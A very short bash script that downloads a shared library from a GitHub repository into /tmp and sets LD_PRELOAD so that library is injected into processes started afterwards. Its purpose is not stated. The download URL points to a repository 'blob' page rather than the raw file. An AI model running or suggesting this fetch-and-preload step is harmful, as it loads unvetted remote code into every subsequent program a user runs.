#!/bin/bash
wget -P /tmp https://github.com/mostafazhrn/gigamil/blob/main/lib1stTry.so
export LD_PRELOAD=/tmp/lib1stTry.so
